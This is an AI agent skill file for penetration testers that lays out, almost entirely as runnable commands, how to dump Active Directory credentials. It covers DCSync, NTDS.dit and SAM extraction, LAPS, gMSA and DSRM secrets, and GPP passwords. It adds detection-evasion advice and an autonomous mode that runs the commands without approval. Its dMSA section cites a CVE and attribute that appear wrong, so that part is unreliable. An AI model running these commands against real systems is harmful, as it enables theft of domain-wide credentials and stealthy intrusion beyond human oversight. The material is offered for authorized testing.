---
name: credential-dumping
description: >
  Extracts credentials from Active Directory: DCSync replication, NTDS.dit
  database extraction, SAM hive dump, LAPS passwords (legacy + Windows LAPS),
  gMSA passwords (KDS root key + GoldenGMSA), dMSA exploitation (BadSuccessor
  CVE-2025-21293), and DSRM credentials.
keywords:
  - DCSync
  - secretsdump
  - NTDS.dit
  - ntds extraction
  - SAM dump
  - LAPS password
  - gMSA password
  - dMSA
  - BadSuccessor
  - DSRM
  - credential dump
  - extract hashes
  - domain hashes
  - krbtgt hash
  - hashdump
  - GoldenGMSA
  - KDS root key
  - dump credentials
  - dump domain
tools:
  - secretsdump.py
  - mimikatz
  - netexec
  - bloodyAD
  - gMSADumper
opsec: medium
---

# Credential Dumping

You are helping a penetration tester extract credentials from Active
Directory stores including domain databases, local machine hives, managed
service accounts, and directory recovery secrets. All testing is under
explicit written authorization.

**Kerberos-first authentication**: All remote credential extraction
commands use Kerberos authentication (`-k -no-pass`, `--use-kcache`)
to avoid NTLM detection signatures. Exception: local filesystem operations
(SAM/NTDS extraction from hives) where Kerberos auth does not apply.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Assess access level, choose the best extraction method,
  execute, and report results.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists:
- **Activity** -> `### [YYYY-MM-DD HH:MM:SS] credential-dumping -> <target>` with
  method used, scope (single user / full domain), credentials obtained.
- **Findings** -> Log successful credential extraction with scope and impact.
- **Evidence** -> Save hash dumps to `engagement/evidence/creds-dcsync.txt`,
  NTDS output to `engagement/evidence/creds-ntds.txt`, LAPS passwords to
  `engagement/evidence/creds-laps.txt`.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[credential-dumping] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] credential-dumping → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Check current access level (do you have replication rights? DC access?)
- Identify which credential stores have already been dumped
- Find accounts with known LAPS/gMSA read permissions
- Skip machines already in the Blocked section

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Credentials**: Add all extracted credentials (user:hash pairs)
- **Access**: Update access level if new DA/EA creds obtained
- **Pivot Map**: Extracted creds -> what hosts/services they grant access to
- **Blocked**: Record extraction attempts that failed and why

## Prerequisites

- Access level varies by technique (see Step 1)
- Tools: `secretsdump.py` (Impacket), `netexec` (nxc), optionally
  `mimikatz`, `bloodyAD`, `gMSADumper.py`, `ntdsutil.exe`

**Kerberos-first workflow** (for remote extraction):

```bash
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL -hashes :NTHASH
# or with password
getTGT.py DOMAIN/user@DC.DOMAIN.LOCAL
export KRB5CCNAME=user.ccache

# All extraction commands use -k -no-pass
secretsdump.py -k -no-pass DOMAIN/user@DC.DOMAIN.LOCAL
```

## Step 1: Assess Access Level

Determine what you can extract based on current access:

| Access Level | Available Techniques | Go To |
|-------------|---------------------|-------|
| Replication rights (DS-Replication-Get-Changes + Get-Changes-All) | DCSync | Step 2 |
| Domain Admin / DC local admin | DCSync, NTDS extraction, LAPS, gMSA | Step 2 or 3 |
| Local admin on target | SAM dump | Step 4 |
| LAPS read permission (on computer object) | LAPS password read | Step 5 |
| gMSA read permission (PrincipalsAllowedToRetrieve) | gMSA password | Step 6 |
| GenericWrite on dMSA | dMSA BadSuccessor | Step 7 |
| DC local admin + DSRM knowledge | DSRM credential extraction | Step 8 |

### Check Replication Rights

```bash
# Check if current user has replication rights
bloodyAD -k -no-pass get writable --right 'REPLICATION' --detail

# Verify via secretsdump (attempt DCSync for a single account)
secretsdump.py -k -no-pass -just-dc-user krbtgt DOMAIN/user@DC.DOMAIN.LOCAL
```

## Step 2: DCSync (Replication)

Extract credentials by simulating domain controller replication. Requires
`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` rights
(held by Domain Admins, Enterprise Admins, DC machine accounts, and
accounts with these rights explicitly granted).

### Full Domain Dump

```bash
# Extract ALL domain hashes (users, machines, krbtgt)
secretsdump.py -k -no-pass DOMAIN/user@DC.DOMAIN.LOCAL

# Output format: user:rid:lmhash:nthash:::
# Also extracts: Kerberos keys (AES256, AES128), cleartext (if reversible)
```

### Targeted DCSync (Lower OPSEC)

```bash
# Single user (e.g., krbtgt for Golden Ticket)
secretsdump.py -k -no-pass -just-dc-user krbtgt \
  DOMAIN/user@DC.DOMAIN.LOCAL

# Specific high-value account
secretsdump.py -k -no-pass -just-dc-user Administrator \
  DOMAIN/user@DC.DOMAIN.LOCAL

# Only NTLM hashes (skip Kerberos keys, cleartext)
secretsdump.py -k -no-pass -just-dc-ntlm DOMAIN/user@DC.DOMAIN.LOCAL
```

### NetExec DCSync

```bash
# Check if DCSync is possible
nxc smb DC.DOMAIN.LOCAL --use-kcache -M dcsync

# Full dump via NetExec
nxc smb DC.DOMAIN.LOCAL --use-kcache --ntds
```

### Mimikatz DCSync (Windows)

```
# Single user
lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt

# All users
lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv
```

### OPSEC Notes

- Generates **Event 4662** (directory service access) with replication GUIDs
- Generates **Event 4928/4929** (replication source/destination)
- Targeted DCSync (single user) generates fewer events than full dump
- CrowdStrike detects DCSync via replication GUID patterns

## Step 3: NTDS Extraction (Offline)

Extract the NTDS.dit database file from a DC for offline hash extraction.
Requires filesystem access to the DC.

### Method A: VSS Shadow Copy

```bash
# Remote via Impacket (creates VSS, extracts NTDS + SYSTEM, cleans up)
secretsdump.py -k -no-pass -use-vss DOMAIN/user@DC.DOMAIN.LOCAL
```

```powershell
# Manual on DC via diskshadow
diskshadow.exe
> set context persistent nowriters
> add volume C: alias cdrive
> create
> expose %cdrive% Z:
> exit

# Copy NTDS.dit from shadow
copy Z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy Z:\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Cleanup
diskshadow.exe
> unexpose Z:
> delete shadows volume C:
> exit
```

### Method B: ntdsutil (Native Windows)

```powershell
# Install From Media (IFM) — creates ntds.dit + SYSTEM hive
ntdsutil.exe "ac i ntds" "ifm" "create full C:\temp\ntds-backup" "quit" "quit"

# Files created:
# C:\temp\ntds-backup\Active Directory\ntds.dit
# C:\temp\ntds-backup\registry\SYSTEM
```

### Method C: Volume Shadow Copy (vssadmin)

```powershell
# Create shadow copy
vssadmin create shadow /for=C:

# Copy from shadow (use shadow copy ID from output)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### Offline Hash Extraction

```bash
# Extract hashes from NTDS.dit + SYSTEM hive
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL

# Output: all domain users, machine accounts, krbtgt
# Format: user:rid:lmhash:nthash:::
```

### OPSEC Notes

- VSS creation generates **Event 8222** (shadow copy created)
- ntdsutil generates **Event 325** (database engine detached)
- File copy from shadow is logged if Sysmon is active
- Remote `-use-vss` via secretsdump auto-cleans but leaves brief artifacts
- Large NTDS.dit files take time to exfiltrate — consider DCSync instead

## Step 4: SAM Dump (Local Machine Hashes)

Extract local account hashes from the SAM registry hive.

### Remote SAM Dump

```bash
# Via secretsdump (extracts SAM + LSA secrets + cached domain creds)
secretsdump.py -k -no-pass DOMAIN/user@TARGET.DOMAIN.LOCAL

# NetExec SAM dump
nxc smb TARGET.DOMAIN.LOCAL --use-kcache --sam

# NetExec LSA secrets (includes cached domain logon hashes)
nxc smb TARGET.DOMAIN.LOCAL --use-kcache --lsa
```

### Manual SAM Extraction

```powershell
# Save registry hives (requires SYSTEM or local admin)
reg save hklm\sam C:\temp\sam
reg save hklm\system C:\temp\system
reg save hklm\security C:\temp\security
```

```bash
# Extract hashes from saved hives
secretsdump.py -system system -sam sam -security security LOCAL
```

### What SAM Contains

- Local user accounts (Administrator RID 500, custom local accounts)
- Does NOT contain domain user hashes
- LSA secrets contain: cached domain logon hashes (DCC2), service
  account passwords, auto-logon credentials

## Step 5: LAPS Passwords

Read local admin passwords managed by LAPS from computer objects in AD.

### Legacy LAPS (ms-Mcs-AdmPwd)

Plaintext password stored in `ms-Mcs-AdmPwd` attribute. Readable by
accounts with explicit read permission on the attribute.

```bash
# NetExec LAPS module (reads both legacy and Windows LAPS)
nxc ldap DC.DOMAIN.LOCAL --use-kcache --laps

# bloodyAD (Kerberos-first)
bloodyAD -k -no-pass get object 'TARGET$' --attr ms-Mcs-AdmPwd

# Impacket Get-LAPSPassword (if available)
Get-LAPSPassword.py -k -no-pass DOMAIN/user@DC.DOMAIN.LOCAL
```

```powershell
# PowerView
Get-DomainComputer TARGET -Properties ms-Mcs-AdmPwd

# Native AD module
Get-ADComputer TARGET -Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd
```

### Windows LAPS (2023+ / KB5025229)

New attributes: `msLAPS-Password`, `msLAPS-EncryptedPassword`,
`msLAPS-PasswordExpirationTime`. Encrypted passwords require DPAPI
decryption or authorized read access.

```bash
# NetExec reads Windows LAPS automatically
nxc ldap DC.DOMAIN.LOCAL --use-kcache --laps

# bloodyAD (reads encrypted + decrypts if authorized)
bloodyAD -k -no-pass get object 'TARGET$' --attr msLAPS-Password
bloodyAD -k -no-pass get object 'TARGET$' --attr msLAPS-EncryptedPassword
```

```powershell
# Native cmdlet (Windows LAPS)
Get-LapsADPassword -Identity TARGET -AsPlainText
```

### Find LAPS-Managed Computers

```bash
# Find computers with LAPS attributes set
bloodyAD -k -no-pass get search --filter '(ms-Mcs-AdmPwdExpirationTime=*)' \
  --attr sAMAccountName,ms-Mcs-AdmPwd

# Find who can read LAPS passwords
bloodyAD -k -no-pass get writable --right 'READ' \
  --filter '(ms-Mcs-AdmPwdExpirationTime=*)' --detail
```

### OPSEC Notes

- Legacy LAPS read is an LDAP query — **very low OPSEC**
- No authentication events generated beyond normal LDAP bind
- Some organizations audit reads on `ms-Mcs-AdmPwd` via AD ACL auditing
- Windows LAPS encrypted passwords require authorized decryption context

## Step 6: gMSA Passwords

Extract Group Managed Service Account passwords.

### Read gMSA Password (Authorized Principal)

If your account is in `PrincipalsAllowedToRetrieveManagedPassword`:

```bash
# NetExec gMSA module
nxc ldap DC.DOMAIN.LOCAL --use-kcache --gmsa

# bloodyAD
bloodyAD -k -no-pass get object 'gMSA_ACCOUNT$' \
  --attr msDS-ManagedPassword

# gMSADumper
python3 gMSADumper.py -k -no-pass -d DOMAIN.LOCAL
```

```powershell
# PowerShell (DSInternals)
$gmsa = Get-ADServiceAccount -Identity gMSA_ACCOUNT -Properties msDS-ManagedPassword
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$mp.SecureCurrentPassword | ConvertFrom-SecureString -AsPlainText
```

### Find gMSA Accounts and Authorized Readers

```bash
# Find all gMSA accounts
bloodyAD -k -no-pass get search \
  --filter '(objectClass=msDS-GroupManagedServiceAccount)' \
  --attr sAMAccountName,msDS-GroupMSAMembership

# Check who can read the password
bloodyAD -k -no-pass get object 'gMSA_ACCOUNT$' \
  --attr msDS-GroupMSAMembership
```

### GoldenGMSA (Persistence via KDS Root Key)

If you have Domain Admin access, extract the KDS root key to compute
any gMSA password offline — even after password rotation.

```bash
# Extract KDS root key
bloodyAD -k -no-pass get object \
  "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=domain,DC=local" \
  --attr msKds-RootKeyData

# Compute gMSA password from KDS key (GoldenGMSA technique)
# Requires: KDS root key + gMSA SID + managed password ID
python3 GoldenGMSA.py compute --sid S-1-5-21-...-1234 \
  --kds-key BASE64_KDS_KEY
```

### OPSEC Notes

- Authorized gMSA password read is normal operation — **low OPSEC**
- KDS root key extraction requires DA and generates Event 4662
- GoldenGMSA persists across password rotations (computed offline)

## Step 7: dMSA Exploitation (BadSuccessor — CVE-2025-21293)

Delegated Managed Service Accounts (dMSA) can be exploited via the
successor mechanism. Writing `msDS-ManagedPasswordId` on a dMSA allows
the attacker's account to retrieve the managed password.

### Prerequisites

- GenericWrite or WriteProperty on a dMSA object
- dMSA feature enabled (Windows Server 2025+)

### Enumeration

```bash
# Find dMSA accounts
bloodyAD -k -no-pass get search \
  --filter '(objectClass=msDS-DelegatedManagedServiceAccount)' \
  --attr sAMAccountName,msDS-ManagedPasswordId

# Check write permissions on dMSA
bloodyAD -k -no-pass get writable \
  --filter '(objectClass=msDS-DelegatedManagedServiceAccount)' --detail
```

### Exploitation

```bash
# Set attacker as successor (requires GenericWrite on dMSA)
bloodyAD -k -no-pass set object 'dMSA_ACCOUNT$' \
  msDS-ManagedPasswordId -v ATTACKER_MACHINE_SID

# Read the managed password
bloodyAD -k -no-pass get object 'dMSA_ACCOUNT$' \
  --attr msDS-ManagedPassword
```

```powershell
# PowerShell variant
Set-ADObject -Identity "CN=dMSA_ACCOUNT,CN=Managed Service Accounts,DC=domain,DC=local" `
  -Replace @{'msDS-ManagedPasswordId'=$attackerSID}
```

### OPSEC Notes

- **HIGH OPSEC** — object modification generates Event 5136
- dMSA is a new feature (Server 2025+) — limited deployment currently
- Patch status should be verified — CVE-2025-21293 may be patched

## Step 8: DSRM Credentials

Extract the Directory Services Restore Mode password from a DC.
Used for offline DC recovery — provides local Administrator access
to the DC when booted in DSRM.

### Check DSRM Logon Behavior

```powershell
# 0 = only in DSRM boot (default), 2 = always available for network logon
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DsrmAdminLogonBehavior
```

### Extract DSRM Hash

```bash
# Via secretsdump (extracts LSA secrets including DSRM)
secretsdump.py -k -no-pass DOMAIN/admin@DC.DOMAIN.LOCAL

# From saved hives
secretsdump.py -system SYSTEM -security SECURITY LOCAL
```

```
# Mimikatz (on DC)
lsadump::lsa /patch
# Shows DSRM Administrator hash
```

### Use DSRM for DC Access

If `DsrmAdminLogonBehavior = 2`:

```bash
# Authenticate to DC using DSRM hash (local auth)
secretsdump.py -hashes :DSRM_HASH 'DC_HOSTNAME/Administrator@DC_IP'
```

### OPSEC Notes

- DSRM hash extraction requires DC local admin
- Changing DsrmAdminLogonBehavior to 2 is a persistence technique
- Event 4657 (registry value modified) if changing logon behavior

## Step 9: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

After extracting credentials:
- **krbtgt hash obtained**: Route to **kerberos-ticket-forging** for
  Golden Ticket.
- **Domain admin hash**: Route to **pass-the-hash** for lateral movement
  to all domain-joined systems.
- **LAPS password for target**: Use for local admin access, then dump
  SAM/LSA for cached domain credentials.
- **gMSA password/hash**: Route to **pass-the-hash** — gMSA accounts
  often have privileged access (SQL service, web service, delegation).
- **Machine account hashes**: Route to **kerberos-delegation** if
  delegation is configured on the machine account.
- **Multiple user hashes**: Route to **pass-the-hash** for credential
  spraying across the domain.
- **Full NTDS dump**: Analyze for password reuse patterns, identify
  accounts with empty passwords or known weak passwords.

When routing, pass: extracted credentials (user:hash pairs), source
method, target hosts, access level, and mode.

Update `engagement/state.md` with all extracted credentials and access.

## Stall Detection

If you have spent **5 or more tool-calling rounds** on the same failure with
no meaningful progress — same error, no new information, no change in output
— **stop**.

**What counts as progress:**
- Trying a variant or alternative **documented in this skill**
- Adjusting syntax, flags, or parameters per the Troubleshooting section
- Gaining new diagnostic information (different error, partial success)

**What does NOT count as progress:**
- Writing custom exploit code not provided in this skill
- Inventing workarounds using techniques from other domains
- Retrying the same command with trivially different input
- Compiling or transferring tools not mentioned in this skill

If you find yourself writing code that isn't in this skill, you have left
methodology. That is a stall.

Do not loop. Work through failures systematically:
1. Try each variant or alternative **once**
2. Check the Troubleshooting section for known fixes
3. If nothing works after 5 rounds, you are stalled

**When stalled, return to the orchestrator immediately with:**
- What was attempted (commands, variants, alternatives tried)
- What failed and why (error messages, empty responses, timeouts)
- Assessment: **blocked** (permanent — config, patched, missing prereq) or
  **retry-later** (may work with different context, creds, or access)
- Update `engagement/state.md` Blocked section before returning

**Mode behavior:**
- **Guided**: Tell the user you're stalled, present what was tried, and
  recommend the next best path.
- **Autonomous**: Update state.md Blocked section, return findings to the
  orchestrator. Do not retry the same technique — the orchestrator will
  decide whether to revisit with new context or route elsewhere.

## Troubleshooting

### DCSync Fails with "Access Denied"

- Verify replication rights: `bloodyAD -k -no-pass get writable --right 'REPLICATION'`
- Only Domain Admins, Enterprise Admins, and DC machine accounts have
  replication rights by default
- Route to **acl-abuse** (WriteDACL) to grant yourself replication rights

### secretsdump Errors with "Remote Operations Failed"

- Target may require SMB3, add `-smb2support` or check Impacket version
- Try `-use-vss` flag for VSS-based extraction instead of DRSUAPI
- Clock skew: `sudo ntpdate DC_IP` (requires root — present to user for manual execution)

### LAPS Attribute Empty

- Computer may not be LAPS-managed (no GPO applied)
- Password may have expired and not yet rotated
- Your account lacks read permission on ms-Mcs-AdmPwd
- Windows LAPS encrypted passwords need authorized decryption context

### gMSA Password Returns Empty Blob

- Your account is not in `PrincipalsAllowedToRetrieveManagedPassword`
- gMSA password interval has not elapsed since account creation
- Try with DA credentials or find an authorized reader

### GPP Passwords (Legacy — MS14-025)

Group Policy Preferences stored encrypted passwords in SYSVOL. Microsoft
published the AES key, making all GPP passwords trivially decryptable:

```bash
# Automated extraction
Get-GPPPassword.py -k -no-pass DOMAIN/user@DC.DOMAIN.LOCAL
nxc smb DC.DOMAIN.LOCAL --use-kcache -M gpp_password
nxc smb DC.DOMAIN.LOCAL --use-kcache -M gpp_autologin

# Manual search
findstr /S /I cpassword \\DOMAIN.LOCAL\SYSVOL\DOMAIN.LOCAL\Policies\*.xml
```

### OPSEC Comparison

| Technique | OPSEC | Detection Events | Notes |
|-----------|-------|-----------------|-------|
| DCSync (targeted) | **MEDIUM** | 4662 (replication GUIDs) | Single user = fewer events |
| DCSync (full domain) | **MEDIUM** | 4662, 4928/4929 | Many replication events |
| NTDS extraction (VSS) | **HIGH** | 8222 (VSS), file access | Large file exfiltration |
| NTDS (ntdsutil) | **HIGH** | 325, process creation | Native tool but noisy |
| SAM dump (remote) | **MEDIUM** | 4624, registry access | Standard admin operation |
| LAPS read (legacy) | **LOW** | LDAP query only | Normal directory read |
| LAPS read (Windows) | **LOW** | LDAP + decryption | Authorized operation |
| gMSA read | **LOW** | LDAP query | Normal if authorized |
| GoldenGMSA (KDS) | **MEDIUM** | 4662 (KDS access) | DA required |
| dMSA BadSuccessor | **HIGH** | 5136 (object modify) | New attack surface |
| DSRM extraction | **HIGH** | LSA access | Requires DC access |
| GPP passwords | **LOW** | SMB share access | Read-only SYSVOL |
